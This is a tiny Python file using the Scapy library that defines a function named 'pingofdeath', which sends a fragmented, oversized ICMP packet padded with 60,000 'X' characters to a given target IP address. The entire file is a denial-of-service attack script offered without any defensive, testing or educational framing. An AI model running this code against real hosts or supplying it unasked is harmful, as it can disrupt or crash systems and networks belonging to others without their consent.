from scapy.all import *
from scapy.layers.inet import fragment


def pingofdeath(targetip):
    send(fragment(IP(dst=targetip)/ICMP()/("X"*60000)))
